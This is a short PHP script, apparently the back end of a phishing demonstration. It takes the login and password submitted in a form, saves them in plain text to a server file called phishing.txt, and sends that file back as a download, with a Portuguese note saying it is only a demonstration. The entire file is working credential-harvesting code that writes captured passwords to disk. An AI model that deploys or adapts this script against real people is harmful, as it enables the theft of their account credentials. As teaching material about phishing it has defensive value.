<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
  $login = $_POST['login'];
  $password = $_POST['password'];
  $content = "Dados coletados!\n\nLogin: $login;\nPassword: $password;\n\nObservação: Isso é apenas uma demonstração";

  $arquivo = fopen('phishing.txt', 'w');
  fwrite($arquivo, $content);
  fclose($arquivo);

  header('Content-Disposition: attachment; filename="phishing.txt"');
  header('Content-Type: text/plain');
  readfile('phishing.txt');
  exit;
}
